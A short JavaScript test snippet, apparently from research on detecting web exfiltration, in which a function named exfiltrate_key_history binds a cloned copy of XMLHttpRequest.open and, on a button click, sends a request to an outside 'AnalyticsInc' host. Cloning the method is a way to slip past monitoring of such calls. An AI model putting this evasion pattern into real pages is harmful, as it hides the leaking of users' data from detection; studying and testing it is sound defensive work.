function exfiltrate_key_history() {

    // Clone Function 2
    // Exfiltrate data using XMLHTTP request
	
    xmlhttp=new XMLHttpRequest();
	//var shadow = xmlhttp.bind({});
    //shadow.open("GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true);
	xmlhttp.opennew = xmlhttp.open.bind(xmlhttp);
	xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true);
    xmlhttp.send(null);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
